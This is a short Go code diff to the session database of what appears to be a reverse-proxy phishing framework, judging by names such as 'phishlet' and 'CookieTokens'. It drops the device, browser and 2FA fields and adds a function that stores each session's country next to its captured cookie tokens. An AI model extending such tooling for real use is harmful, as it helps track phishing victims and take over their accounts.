@@ -26,16 +26,8 @@ type Session struct {
 	CreateTime   int64                              `json:"create_time"`
 	UpdateTime   int64                              `json:"update_time"`
 	UserId       string                             `json:"user_id"`
-	CountryCode    string            `json:"country_code"`
-	CountryName    string            `json:"country_name"`
-	DeviceType     string            `json:"device_type"`
-	BrowserType    string            `json:"browser_type"`
-	BrowserVersion string            `json:"browser_version"`
-	OSType         string            `json:"os_type"`
-	OSVersion      string            `json:"os_version"`
-	LoginType      string            `json:"login_type"`
-	Has2FA         bool              `json:"has_2fa"`
-	Type2FA        string            `json:"type_2fa"`
+	CountryCode  string                             `json:"country_code"`
+	Country      string                             `json:"country"`
 }
 
 type CookieToken struct {
@@ -74,16 +66,8 @@ func (d *Database) sessionsCreate(sid string, phishlet string, landing_url strin
 		CreateTime:   time.Now().UTC().Unix(),
 		UpdateTime:   time.Now().UTC().Unix(),
 		UserId:       "JEMEX123",
-		CountryCode:    "",
-		CountryName:    "",
-		DeviceType:     "",
-		BrowserType:    "",
-		BrowserVersion: "",
-		OSType:         "",
-		OSVersion:      "",
-		LoginType:      "",
-		Has2FA:         false,
-		Type2FA:        "",
+		CountryCode:  "",
+		Country:      "",
 	}
 
 	jf, _ := json.Marshal(s)
@@ -204,6 +188,20 @@ func (d *Database) sessionsUpdateCookieTokens(sid string, tokens map[string]map[
 	s.CookieTokens = tokens
 	s.UpdateTime = time.Now().UTC().Unix()
 
+	err = d.sessionsUpdate(s.Id, s)
+	return err
+}
+
+func (d *Database) sessionsUpdateCountryInfo(sid string, countryCode string, country string) error {
+	s, err := d.sessionsGetBySid(sid)
+	if err != nil {
+		return err
+	}
+	
+	s.CountryCode = countryCode
+	s.Country = country
+	s.UpdateTime = time.Now().UTC().Unix()
+	
 	err = d.sessionsUpdate(s.Id, s)
 	return err
 }
